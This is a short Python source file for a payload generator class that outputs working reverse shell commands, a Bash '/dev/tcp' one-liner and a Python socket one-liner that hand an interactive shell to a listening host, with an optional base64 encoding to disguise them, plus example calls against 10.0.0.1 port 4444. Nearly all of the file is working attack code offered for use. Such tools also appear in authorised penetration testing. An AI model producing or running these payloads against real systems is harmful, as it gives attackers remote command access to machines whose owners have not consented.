import base64

class PayloadGenerator:
    """
    A class for generating various types of payloads.
    Supports different payload types and encoding schemes.
    """
    def generate_payload(self, payload_type, lhost, lport, encode=None):
        """
        Generates a payload based on the specified type and parameters.

        Args:
            payload_type (str): The type of payload to generate (e.g., 'bash_reverse_shell').
            lhost (str): The listening host (LHOST) for the payload to connect back to.
            lport (int): The listening port (LPORT) for the payload.
            encode (str, optional): The encoding scheme to use (e.g., 'base64').

        Returns:
            str: The generated payload, or an error message if the type is invalid.
        """
        if payload_type == 'bash_reverse_shell':
            payload = self._generate_bash_reverse_shell(lhost, lport)
        elif payload_type == 'python_reverse_shell':
            payload = self._generate_python_reverse_shell(lhost, lport)
        else:
            return f"Error: Invalid payload type '{payload_type}'."

        if encode == 'base64':
            return self._encode_base64(payload)

        return payload

    def _generate_bash_reverse_shell(self, lhost, lport):
        """Generates a Bash reverse shell payload."""
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    def _generate_python_reverse_shell(self, lhost, lport):
        """Generates a Python reverse shell payload."""
        return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

    def _encode_base64(self, payload):
        """Encodes a payload using Base64."""
        return base64.b64encode(payload.encode('utf-8')).decode('utf-8')

# Example usage for testing
if __name__ == '__main__':
    generator = PayloadGenerator()

    # Bash reverse shell
    bash_payload = generator.generate_payload('bash_reverse_shell', '10.0.0.1', 4444)
    print(f"Bash Reverse Shell:\n{bash_payload}\n")

    # Base64 encoded Bash reverse shell
    bash_encoded_payload = generator.generate_payload('bash_reverse_shell', '10.0.0.1', 4444, encode='base64')
    print(f"Base64 Encoded Bash Reverse Shell:\n{bash_encoded_payload}\n")

    # Python reverse shell
    python_payload = generator.generate_payload('python_reverse_shell', '10.0.0.1', 4444)
    print(f"Python Reverse Shell:\n{python_payload}\n")
